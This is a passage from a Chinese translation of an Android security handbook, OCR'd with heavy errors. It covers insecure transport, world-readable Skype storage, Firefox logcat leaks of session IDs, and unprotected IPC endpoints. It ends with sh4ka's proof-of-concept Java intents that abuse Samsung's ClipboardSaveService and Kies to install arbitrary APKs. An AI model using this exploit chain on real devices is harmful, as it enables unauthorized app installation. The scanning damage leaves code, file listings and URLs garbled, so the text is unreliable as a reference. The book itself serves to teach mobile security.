口强加密，但缺少对安全警告或证书验证错误的处理；
口在安全协议失效后使用明文；
口在不同网络类型（如移动连接与Wi-Fi）上的传输安全使用上的不一致。
发现不安全传输问题就像监听目标设备的流量一样简单。构建一个中间人设备的详细过程已
经超出了本书的范围，但是有大量的工具和教程可以帮助你完成这个任务。Android模拟器支持
对网络流量进行代理，以及支持将流量转储为PCAP格式的网络数据文件。你可以分别通过传递
-http-proxy或-tcpdump选项来完成这些功能。
不安全数据传输的—个突出的公开例子是，Google ClientLogin身份认证协议在 Android 2.1
至2.3.4版本某些组件中的实现。ClientLogin协议允许应用请求用户的Google账户认证令牌，然
后后者可以被复用，以处理指定服务API的后续事务。
2011年，德国乌尔姆大学的研究者发现，Android2.1至2.3.3版本的日历与联系人应用，以
---
## Page 83
4.1普遍性安全问题67
及Android2.3.4版本上的Picasa Sync服务通过明文HTTP协议发送Google ClientLogin认证令牌。
这一令牌被攻击者获得后，可以被重用来假冒成用户。因为有大量现成的工具与技术支持在Wi-Fi
网络中执行中间人攻击，因此对这一令牌进行劫持非常简单，而这对通过不安全或不受信任的
Wi-Fi网络上网的用户来说是个坏消息
关于乌尔姆大学发现的Google ClientLogin安全漏洞的更多信息，参见htp:/www.uni-ulm.
de/en/in/mi/staff/koenings/catching-authtokens.html
4.1.3不安全的数据存储
Android为数据存储提供了多种标准支持，包括共享配置文件（SharedPreferences）、SQLite
数据库和原始文件。另外，每种存储类型还能以多种方式创建和访问，包括通过受管理代码或原
生代码，或者通过类似于ContentProviders的结构化接口。最普遍的错误包括对敏感数据的明文
存储、未受保护的ContentProviders接口（稍后讨论），以及不安全的文件权限。
一个同时存在明文存储和不安全文件权限两种安全问题的案例是Android版的Skype客户
端，这个间题被于2011年4月被发现，由Justin Case（jcase）在http://AndroidPolice.com网站上
发布。这个Skype应用创建了许多拥有全局可读和全局可写权限的文件，如SQLite数据库和XML
文件等。另外，这些内容是没有经过加密的，而且还包含了配置数据和即时通信日志。以下显示
了jcase自己手机上Skype应用的数据目录，以及部分文件内容。
rw-zv-rv- app_152
app_152
331776 2011-04-13 00:08 main.db
-rw-rw-rw- app_152
app_152
119528 20110413 00:08 main.db-fourna1
TW-IWrW- 
app_152
app_152
40960 2011-04-11 14:05 keyva1.db
dde x
TWIWrW- 
app_152
app_152
3522 2011-04-12 23:39
config.xm]
-rw-rwrw- app_152
aPp_152
201104-11 14:05 voicemai1
-rw-rv-rw- app_152
app_152
61440 2011-04-13 00:08 bistats.db
0 2011-04-11 14:05 config.1ck
drwxrwxrwx app_152
app_152
app_152
12824 2011-0411 14:05 keyval.db-fournal
2011-04-12 21:49 chatsync
-rw-rwrw- app_152
app_152
app_152
4pp_152
33344 2011-04-13 00:08 bistats.db-5ournal
 grep Defau1t /data/data/com.skype .mer1in_mecha/ f11es/shared.xm1
jcaseap
先抛开明文存储问题不说，不安全的文件权限起因于一个之前不太为人所知的Android原生
文件创建问题。通过Java接口创建的SQLite数据库、共享配置文件和原始文件都使用0660的文
件权限，这使得文件对于所属的用户ID和用户组ID都是可读写的，然面当通过原生代码或外部
指令创建文件时，应用进程会继承其父进程Zygote的文件权限掩码000”，这意味着全局可读写。
Skype客户端使用原生代码来实现它的绝大多数功能，包括创建这些文件并与之进行交互。
①对应的文件权限为777。一译者注
---
## Page 84
68
第4章云计算的安全风险
注意Android4.1版本之后，Zygote进程的文件权限掩码已经被设置到一个更加安全的值077。
关于这一变化的评细信息将在第12章申说明。
关于jcase 发现的Skype安全漏润的详细信息，请参考http://www.androidpolice.com/2011/04/
14/exclusive-vulnerability-in-skype-for-android-is-exposing-your-name-phone-number-chat-logs-and
a-lot-more/
4.1.4通过日志的信息泄露
Android日志是信息泄露的一个主要途径，通过开发者对日志方法的滥用（通常是出于调试
目的），应用可能会记录下包括普通的诊断消息、登录凭证或其他敏感数据的任何信息。甚至系
统进程，如ActivityManager，也会对Activity调用的详细信息进行记录。带有READ_LOGS权限
的应用通过1ogcat命令就可以获得对这些日志消息的访问权。
注意READ_LOGS权限在Android4.1版本之后不再对第三方应用开放，然而，对于更老的版本
以及被root的设备，第三方应用仍有可能获取到这一权限和对1ogcat命令的访问。
作为ActivityManager日志消息粒度的一个示例，可以看如下日志消息片段：
dat=http: /wnwr, wi1ey, com/
I/ActivityManager (13738): START (act=android.intent,action.VIEW
cmp=com.google.android.browser/com.android.browser BrowserActivity
(has extras) u=0) from pid 11352
I/ActivityManager(13738): Start proc com.google.android.browser for
pid=11433 uid=10017 gids=(3003, 1015, 1028)
r/com.android.browser,BrowserActavaty:
你可以看到官方浏览器正在被调用，或许是由用户在一封电子邮件或一条短信中点击链接而
触发的。被传递Intent的详细信息也可以清楚看到，包括用户正在访问的URL（http:/www
wily.com/）。尽管这个小例子看起来并不是个严重的问题，但是在某种环境下，这代表有可能获
取到用户的上网信息。
一个关于过度日志更具有说服力的案例发生在Android版的Firefox浏览器中。2012年12月，
Neil Bergman在Mozilla bug跟踪器上报告了这个安全问题。Android版的 Firefox浏览器记录了浏
览行为，包括访间的URL。在某种情况下，还可能会包括一些会话标识符，Neil在他的安全间
题报告条目中指出这一间题，并加上了1ogcat命令的输出结果：
https: //mobi1e.walmart .com/pharmacy:jse88ionid=83c8330691854B071cD172D41Dc2C3
I/GeckoBrowserApp (17773) : Favicon 8uccessfu11y 1oaded for URL =
I/GeckoBrowserApp (17773) : Favicon is for current URL =
http81 //mobi1e,walmart .com/m/pharmacy:jsessionid=83cB3306918548071CD172D41DC2C3
①对应的文件权限为700。译者注
---
## Page 85
4.1普遍性安全问题
69
/GeckoConsole(17773): [JavaSeript Harning : *Brror in parsing value for
AB
*background',Declaration dropped.* (fi1e:
3AB?vieket:bookmarkablePage=:com, wm.mobile,web.rx.prIvacy . PrivacyPractices *
*http8: //mobi1e.wa1mart . com/m/pharmacy: Jsessionid=83CB330691854B071CD172D41Dc2C
1ine: 0)1
在这个案例中，一个拥有日志访问权限的恶意应用可能截获这些会话标识符，并劫持用户在
远程Web 应用上的会话。关于这一问题的更多详情，参见Mozilla bug 跟踪器，网址为
https://bugzilla. mozilla.org/show_bug-cgi?id825685
4.1.5不安全的IPC端点
常用的进程间通信（IPC）端点包括 Service、Activity、Broadcast Receiver 和 Content Provider，
而作为潜在的攻击面，这些IPC端点经常被忽视。这些IPC端点同时作为数据源和数据目的池，
如何与它们进行交互主要取决于它们的实现，面对于是不是对它们的滥用也要看它们的用途。在
最基本的层次上，对于这些接口的防护通常通过应用权限来达成，包括标准权限和定制权限。举
例来说，一个应用可以定义一个IPC端点只能由这个应用中的其他组件访问，或者只能由请求了
指定权限的其他应用访问。
在IPC端点没有被恰当地进行安全防护，或者在一个恶意应用请求并被授予了所要求的权限
时，对于每种端点有一些特定的考虑。ContentProvider在设计上就暴露了对结构化数据的访间，
因此可能遭遇一系列攻击，比如注入或者目录遍历。Activity，作为面向用户的组件，可能会被
恶意应用用来进行界面伪装（UI-redressing）攻击。
BroadcastReceiver经常被用来处理隐式Intent消息，或系统范围事件等拥有宽松标准的Intent
消息。例如，接收到一条新短消息后，Telephony子系统会广播一个拥有SMS_RECEIVED动作的
隐式Intent，而带有匹配这一动作的Intent过滤器的注册BroadcastReceiver将收到这条消息。然
而Intent过滤器的优先级属性（不限于BroadcastReceiver）可以决定隐式Intent发送的先后次序，
这会导致潜在的对广播消息的劫持或拦截。
注意隐式Intent是那些没有指定特定目标组件的Intent，而显式Intent则以一个特定的应用和
组件作为接收目标，如com.wiley.exampleapp.SomeActivity
如第2章所述，Service是应用进行后台处理的组件。类似于Broadcast Receiver和Activity，
与 Service的交互也是使用Intent完成的，这包括启动Service、停止Service和绑定Service等动
作。一个绑定后Service可能会向其他应用暴露出与应用相关的另一层次功能，因为这些功能都
是定制的，开发者也可能暴露出一个可以执行任意命令的方法。
一个利用未受保护IPC接口的潜在影响的案例是，Andre“sh4ka”Moulu在三星Galaxy S3
上的Kies应用中发现的安全漏洞。sh4ka 发现Kies 是一个拥有很高权限（包括INSTALL
PACKAGES 权限）的系统应用，它有一个BroadcastReceiver组件，用于恢复/sdcard/restore 目录
---
## Page 86
70第4章云计算的安全风险
下的应用包（APK）。下面的代码片段是sh4ka对Kies应用的反编译。
publie void onReceive (Context paramContext, Intent paramIntent)
if (paramIntent,getAction().toString ().equals (
*com, intent ,action.KIES_START_RESTORE_APK*))
kies_start .a_nKiesActionEvent = 15;
int i3 = Log.v(*KIES_START*,
*KIES_ACTION_EVENT_SZ_START_RESTORE_APK*) :
[9]9g m0 = t9ggexxe []9q
byte[1arrayofByte12
byte[] arrayOfByte13 = paramIntent .getByteArrayExtra(*body*) ;
 = paramIntent ,getByteArrayExtra(*head*) ;
System.arraycopy(arrayofByte13, 0, arrayofByte14, 0, 14):
int 14 = arrayofByte13.1engthj
StartKiesService (paramContext, arrayofByte12, arrayofByte14) :
return;
在上面这段代码中你可以看到，onReceive 方法接收一个Intent，即paramIntent。调用
getAction 函数会检查 paraIntent 的 Action 值是否为 KIES_START_RESTORE_APK，如果
为true，方法将从paramIntent中提取出儿个extra值（包括head和body），然后调用 Start
KiesService。调用链最终会导致Kies应用对/sdcardrestore进行递归遍历，安装里面的每个APK。
为了将自己的APK在没有任何权限的情况下放置在/sdcard/restore目录中，sh4ka利用了另一
个可获取wRITE_EXTERNAL_STORAGE 权限的安全漏洞。在他的漏洞报告“FromOpemm app to
INSTALL_PACKAGES”中，sh4ka 利用了三星Galaxy S3手机上的 C1ipboardSaveService 服
务。以下代码片段演示了这一漏洞利用。
Intent intentCreateTemp = new Intent (*com.android.clipboardsaveservice.
IntentCreateTemp -putExtra (*copyPath* , */data/data/ *+getPackageliame ()+
CLIPBOARD_SAVE_SERVICE*1 ;
*/files/avast.apk*) :
IintentCreateTemp -putExtra (*pastePath*,
* /data/data/com, android.clipboardsaveservice/temp/*) :
startService (intentCreateTenp) ;
在这里，sh4ka的代码创建了—个以com，android.clipboardsaveservice，CLIPBOARD_
SAVE_SERVICE为目标的Intent，并在传递的cxtra域中包含了程序包的源路径（位于他的概念验
证攻击代码应用的数据存储目录），以及目标路径为/sdcard/restore。对startService函数的调
用会发送这个Intent，然后 ClipboardService 便将APK复制到/sdcard。所有这些动作在概念
验证攻击应用没有WRITE_EXTERNAL_STORAGE权限时也能正常工作。
最后开始致命一击，构造一个适当的Intent发送给Kies，获取任意程序包安装的机会：
new Intent (*com.Intent-action.KIES_START_RESTORE_APK*) ;
Intent intentstartRestore =
intentStartRestore.putExtra(*head*, nev String (*cocacola*) -getBytes());
intentStartRestore.putExtra(*body*, new String(*cocacola*) -getBytes()) ;
sendBroadcast (IntentStartRestore) :
---
## Page 87